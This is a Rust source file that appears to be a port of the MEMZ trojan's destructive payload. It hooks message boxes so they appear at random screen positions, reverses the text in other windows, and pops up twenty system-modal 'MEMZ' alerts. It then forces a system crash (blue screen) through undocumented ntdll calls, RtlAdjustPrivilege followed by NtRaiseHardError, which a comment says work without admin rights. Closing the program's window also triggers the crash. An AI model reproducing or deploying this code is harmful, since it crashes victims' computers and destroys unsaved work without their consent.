use std::{
    mem::size_of_val,
    thread::{self, sleep},
    time::Duration,
};

use rand::Rng;
use windows::Win32::{
    Foundation::{BOOL, HMODULE, HWND, LPARAM, LRESULT, NTSTATUS, TRUE, WPARAM},
    UI::WindowsAndMessaging::{
        CallNextHookEx, DefWindowProcA, SendMessageTimeoutW, CBT_CREATEWNDA, HCBT_CREATEWND, HHOOK,
        MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, SMTO_ABORTIFHUNG, SM_CXSCREEN, SM_CYSCREEN, WH_CBT,
        WINDOW_STYLE, WM_CLOSE, WM_ENDSESSION, WM_GETTEXT, WM_SETTEXT, WS_DLGFRAME, WS_POPUP,
    },
};

#[cfg(feature = "DEBUG_MODE")]
use crate::utils::log::*;

use crate::{
    data::msg::MSGS,
    ntdll::{
        library::Library,
        ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
    },
    s_v,
    wrap_windows_api::{
        wrap_get_current_thread_id, wrap_get_system_metrics, wrap_messagebox_a,
        wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, WinError,
    },
    GMEM_ZEROINIT,
};

/// # Safety
///
/// This function is CallBack function
/// This function should not be called before the horsemen are ready.
pub unsafe extern "system" fn msg_box_hook(ncode: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if ncode == HCBT_CREATEWND as i32 {
        let pcs = (*(lparam.0 as *mut CBT_CREATEWNDA)).lpcs;
        if (WINDOW_STYLE((*pcs).style as u32) & WS_DLGFRAME) != WINDOW_STYLE(0)
            || (WINDOW_STYLE((*pcs).style as u32) & WS_POPUP) != WINDOW_STYLE(0)
        {
            let _hwnd = HWND(wparam.0 as isize);
            let (scrw, scrh) = (
                wrap_get_system_metrics(SM_CXSCREEN).expect("Failed GetSystemMetrics"),
                wrap_get_system_metrics(SM_CYSCREEN).expect("Failed GetSystemMetrics"),
            );
            let coordinate = (
                rand::random::<i32>() % (scrw - (*pcs).cx),
                rand::random::<i32>() % (scrh - (*pcs).cy),
            );
            (*pcs).x = coordinate.0;
            (*pcs).y = coordinate.1;
        }
    }

    CallNextHookEx(HHOOK(0_isize), ncode, wparam, lparam)
}

/// # Safety
///
/// This function is CallBack function
/// This function should not be called before the horsemen are ready.
pub unsafe extern "system" fn enum_child_proc(hwnd: HWND, _lparam: LPARAM) -> BOOL {
    let mut alloc = vec![GMEM_ZEROINIT; 8192];
    if SendMessageTimeoutW(
        hwnd,
        WM_GETTEXT,
        WPARAM(8192),
        LPARAM(size_of_val(&alloc) as isize),
        SMTO_ABORTIFHUNG,
        100,
        None,
    )
    .0 != 0
    {
        alloc.reverse();
        SendMessageTimeoutW(
            hwnd,
            WM_SETTEXT,
            WPARAM::default(),
            LPARAM(size_of_val(&alloc) as isize),
            SMTO_ABORTIFHUNG,
            100,
            None,
        );
    }
    TRUE
}

/// # Safety
///
/// This function is CallBack function
/// This function should not be called before the horsemen are ready.
pub unsafe extern "system" fn window_proc(
    hwnd: HWND,
    msg: u32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    if msg == WM_CLOSE || msg == WM_ENDSESSION {
        kill_windows().expect("Failed KillWindows() Proc");
        LRESULT(0)
    } else {
        let res = DefWindowProcA(dbg!(hwnd), dbg!(msg), dbg!(wparam), dbg!(lparam));
        if res.0 == 0 {
            panic!("Failed DefWindowProcA(): {res:?}\n");
        } else {
            res
        }
    }
}

pub fn kill_windows() -> Result<(), WinError> {
    for _ in 0..20 {
        let rip_message_thread = thread::spawn(move || -> Result<(), WinError> {
            let hook = wrap_set_windows_hook_ex_a(
                WH_CBT,
                Some(msg_box_hook),
                HMODULE(0_isize),
                wrap_get_current_thread_id(),
            )?;
            let mut rng = rand::thread_rng();
            let random = rng.gen_range(0..=25);
            wrap_messagebox_a(
                HWND(Default::default()),
                s_v!(MSGS[random as usize]),
                "MEMZ",
                MB_OK | MB_SYSTEMMODAL | MB_ICONHAND,
            )?;
            wrap_unhook_windows_hook_ex(hook)?;
            Ok(())
        });
        rip_message_thread.join().unwrap().unwrap();
        sleep(Duration::from_millis(100));
    }

    kill_windows_instant()?;
    Ok(())
}

fn kill_windows_instant() -> Result<(), WinError> {
    // Try to force BSOD first
    // I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
    // This isn't even an exploit, it's just an undocumented feature.
    let mut tmp1 = 0;
    let mut tmp2 = 0;
    let lib = Library::new("ntdll.dll");
    let rtl_adjust_privilege_proc: Option<RtlAdjustPrivilegeFn> =
        lib.get_proc("RtlAdjustPrivilege");

    match rtl_adjust_privilege_proc {
        Some(rtl_adjust_privilege) => rtl_adjust_privilege(19, 1, 0, &mut tmp1),
        None => {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(
                LogType::ERROR,
                LogLocation::LOG,
                "Failed GetProc RtlAdjustPrivilege",
            );
            panic!("Failed GetProc RtlAdjustPrivilege")
        }
    };

    let nt_raise_hard_error_proc: Option<NtRaiseHardErrorFn> = lib.get_proc("NtRaiseHardError");

    match nt_raise_hard_error_proc {
        Some(nt_raise_hard_error) => {
            nt_raise_hard_error(NTSTATUS(0xc0000022_u32 as i32), 0, 0, 0, 6, &mut tmp2)
        }
        None => {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(
                LogType::ERROR,
                LogLocation::LOG,
                "Failed GetProc NtRaiseHardError",
            );
            panic!("Failed GetProc NtRaiseHardError")
        }
    };

    Ok(())
}
